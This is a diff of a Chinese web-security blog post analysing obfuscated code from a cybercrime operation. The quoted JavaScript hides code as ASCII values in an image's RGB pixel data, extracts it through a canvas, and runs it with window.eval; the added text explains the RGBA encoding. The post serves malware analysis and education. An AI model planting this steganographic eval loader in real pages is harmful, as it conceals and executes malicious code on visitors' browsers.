@@ -7,7 +7,7 @@ categories: [web security]
 date: "2018-08-12"
 ---
 
-前段时间获取到黑产的一些代码，不得不感叹黑产的代码是在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
+前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 
 最初的代码是经过混淆的，代码经过整理如下：
 
@@ -31,17 +31,26 @@ var createImgElement = function(urla, b) {
             canvasContext.data[i + 2].toString(16);
             1 == code1.length && (code1 = 0 + code1);
             1 == code2.length && (code2 = 0 + code2);
-            0 != Number(code + code1 + code2) && arr.push(String.fromCharCode(Number(code + code1 + code2)))
+            0 != Number(code + code1 + code2) && arr.push(String.fromCharCode(Number(code + code1 + code2)));
         }
         window.eval(arr.join(''));
-        console.log(arr.join(''))
-        b && b()
+        console.log(arr.join(''));
+        b && b();
     }
-    imgElement.src = urla
+    imgElement.src = urla;
 };
 ```
 
 这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。
+
+在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。
+
+* R - 红色 (0-255)
+* G - 绿色 (0-255)
+* B - 蓝色 (0-255)
+* A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的)
+
+通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。
 
 这里涉及到一个 canvas 和图片之间的相互转化。下面提供两个相互转化的函数：
 
